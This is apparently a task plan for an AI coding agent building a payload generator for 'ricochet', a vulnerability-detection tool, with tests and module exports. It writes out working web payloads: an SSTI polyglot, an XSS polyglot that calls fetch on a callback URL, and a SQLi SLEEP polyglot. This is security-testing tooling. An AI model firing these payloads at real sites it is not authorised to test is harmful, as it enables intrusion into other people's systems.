---
phase: 06-vulnerability-payloads
plan: 04
type: execute
wave: 2
depends_on: ["06-01", "06-02", "06-03"]
files_modified:
  - ricochet/payloads/polyglot.py
  - ricochet/payloads/builtin/polyglot-detection.txt
  - ricochet/payloads/__init__.py
autonomous: true

must_haves:
  truths:
    - "Polyglot payloads work across multiple contexts without modification"
    - "SSTI polyglot triggers on 51/51 template engines"
    - "XSS polyglot works across HTML contexts (body, attribute, script)"
  artifacts:
    - path: "ricochet/payloads/polyglot.py"
      provides: "Polyglot payload generator class"
      exports: ["PolyglotPayloadGenerator"]
    - path: "ricochet/payloads/builtin/polyglot-detection.txt"
      provides: "3 universal polyglot payloads"
      min_lines: 3
    - path: "ricochet/payloads/__init__.py"
      provides: "Complete module exports for all generators"
      exports: ["XSSPayloadGenerator", "SQLiPayloadGenerator", "SSTIPayloadGenerator", "PolyglotPayloadGenerator"]
  key_links:
    - from: "ricochet/payloads/__init__.py"
      to: "ricochet/payloads/xss.py"
      via: "import XSSPayloadGenerator"
      pattern: "from .xss import"
    - from: "ricochet/payloads/__init__.py"
      to: "ricochet/payloads/sqli.py"
      via: "import SQLiPayloadGenerator"
      pattern: "from .sqli import"
    - from: "ricochet/payloads/__init__.py"
      to: "ricochet/payloads/ssti.py"
      via: "import SSTIPayloadGenerator"
      pattern: "from .ssti import"
    - from: "ricochet/payloads/__init__.py"
      to: "ricochet/payloads/polyglot.py"
      via: "import PolyglotPayloadGenerator"
      pattern: "from .polyglot import"
---

<objective>
Create polyglot payload generator and finalize module exports

Purpose: Generate universal polyglot payloads that trigger detection across multiple vulnerability contexts. Polyglots reduce testing effort by working in XSS, SSTI, and SQLi contexts without modification. Also consolidate all generator exports in the module __init__.py.

Output: PolyglotPayloadGenerator class + 3 polyglot payloads + complete module exports
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/06-vulnerability-payloads/06-RESEARCH.md

@ricochet/injection/payloads.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create polyglot payload file and generator</name>
  <files>
    ricochet/payloads/builtin/polyglot-detection.txt
    ricochet/payloads/polyglot.py
  </files>
  <action>
1. Create `ricochet/payloads/builtin/polyglot-detection.txt` with 3 universal polyglots:
```
# Universal polyglot payloads for initial vulnerability detection
# {{CALLBACK}} replaced with callback URL

# SSTI polyglot - works on 51/51 template engines (Hackmanit)
<%'${{/#{@}}%>{{

# XSS polyglot with callback - works across HTML contexts
'--><img/src=x onerror=fetch('{{CALLBACK}}')>

# SQLi time-based polyglot (detection, not OOB)
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

2. Create `ricochet/payloads/polyglot.py`:

```python
class PolyglotPayloadGenerator:
    vuln_type = "polyglot"

    def generate(self, callback_url: str) -> Iterator[tuple[str, str]]:
        """Yield (payload, context) tuples.

        Context is 'universal' for polyglots since they work across contexts.
        """
        builtin_dir = Path(__file__).parent / "builtin"
        filepath = builtin_dir / "polyglot-detection.txt"

        if filepath.exists():
            for payload in load_payloads(filepath):
                yield (payload, "universal")
```

Note: Polyglots are designed for initial detection. The SSTI polyglot causes errors/output in 51 template engines. The XSS polyglot has a callback for browser execution detection. The SQLi polyglot uses time-based detection (not OOB) as a fallback.
  </action>
  <verify>
```bash
python -c "from ricochet.payloads.polyglot import PolyglotPayloadGenerator; g = PolyglotPayloadGenerator(); print(list(g.generate('http://test')))"
```
Should print 3 tuples with "universal" context.
  </verify>
  <done>
- PolyglotPayloadGenerator class created
- 3 universal polyglot payloads in builtin file
- Generator yields (payload, "universal") tuples
  </done>
</task>

<task type="auto">
  <name>Task 2: Finalize module exports and add tests</name>
  <files>
    ricochet/payloads/__init__.py
    tests/test_payloads_polyglot.py
  </files>
  <action>
1. Update `ricochet/payloads/__init__.py` with all exports:

```python
"""
Payload generators for vulnerability detection.

Each generator yields (payload, context) tuples where:
- payload: String with {{CALLBACK}} placeholder for correlation
- context: Hint about where payload is effective (html, mssql, jinja2, universal, etc.)

Generators:
- XSSPayloadGenerator: Browser-executed XSS payloads
- SQLiPayloadGenerator: Database-specific OOB SQLi payloads
- SSTIPayloadGenerator: Template engine command execution payloads
- PolyglotPayloadGenerator: Universal detection payloads
"""

from ricochet.payloads.xss import XSSPayloadGenerator
from ricochet.payloads.sqli import SQLiPayloadGenerator
from ricochet.payloads.ssti import SSTIPayloadGenerator
from ricochet.payloads.polyglot import PolyglotPayloadGenerator

__all__ = [
    "XSSPayloadGenerator",
    "SQLiPayloadGenerator",
    "SSTIPayloadGenerator",
    "PolyglotPayloadGenerator",
]
```

2. Create `tests/test_payloads_polyglot.py`:
- Test generates 3 polyglot payloads
- Test vuln_type returns "polyglot"
- Test context is "universal" for all payloads
- Test XSS polyglot contains {{CALLBACK}}
- Test SSTI polyglot contains known pattern (e.g., "{{")

3. Create `tests/test_payloads_integration.py`:
- Test all generators importable from ricochet.payloads
- Test each generator has vuln_type property
- Test each generator's generate() method works
  </action>
  <verify>
```bash
# All exports work
python -c "from ricochet.payloads import XSSPayloadGenerator, SQLiPayloadGenerator, SSTIPayloadGenerator, PolyglotPayloadGenerator; print('All imports successful')"

# Tests pass
python -m pytest tests/test_payloads_polyglot.py tests/test_payloads_integration.py -v
```
  </verify>
  <done>
- All 4 generators exported from ricochet.payloads
- __all__ defined with all exports
- Polyglot tests pass
- Integration tests verify all generators work
  </done>
</task>

</tasks>

<verification>
```bash
# All generators importable from main module
python -c "from ricochet.payloads import XSSPayloadGenerator, SQLiPayloadGenerator, SSTIPayloadGenerator, PolyglotPayloadGenerator; print('All 4 generators imported')"

# Each generator produces payloads
python -c "
from ricochet.payloads import XSSPayloadGenerator, SQLiPayloadGenerator, SSTIPayloadGenerator, PolyglotPayloadGenerator

xss = list(XSSPayloadGenerator().generate('http://test'))
sqli = list(SQLiPayloadGenerator().generate('http://test'))
ssti = list(SSTIPayloadGenerator().generate('http://test'))
poly = list(PolyglotPayloadGenerator().generate('http://test'))

print(f'XSS: {len(xss)} payloads')
print(f'SQLi: {len(sqli)} payloads')
print(f'SSTI: {len(ssti)} payloads')
print(f'Polyglot: {len(poly)} payloads')
print(f'Total: {len(xss) + len(sqli) + len(ssti) + len(poly)} payloads')
"

# All tests pass
python -m pytest tests/test_payloads_*.py -v
```
</verification>

<success_criteria>
- PolyglotPayloadGenerator class exists
- Generates 3 universal polyglot payloads
- All 4 generators exported from ricochet.payloads
- Module docstring explains generator interface
- All payload tests pass
- Total payloads >= 22 (5 XSS + 8 SQLi + 6 SSTI + 3 polyglot)
</success_criteria>

<output>
After completion, create `.planning/phases/06-vulnerability-payloads/06-04-SUMMARY.md`
</output>
